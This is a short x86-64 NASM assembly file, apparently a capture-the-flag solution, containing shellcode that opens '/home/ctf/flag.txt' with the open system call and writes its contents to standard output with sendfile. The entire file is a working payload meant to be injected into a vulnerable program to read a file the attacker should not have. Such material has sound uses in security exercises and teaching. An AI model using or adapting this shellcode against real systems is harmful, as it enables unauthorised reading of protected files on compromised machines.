    BITS 64
    DEFAULT REL

    section .text
    global _start

; nasm -f bin shellcode.asm -o shellcode.bin
_start:
    lea rdi, [flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov r10, 0x40
    mov rax, 40
    syscall
    

flag: db "/home/ctf/flag.txt", 0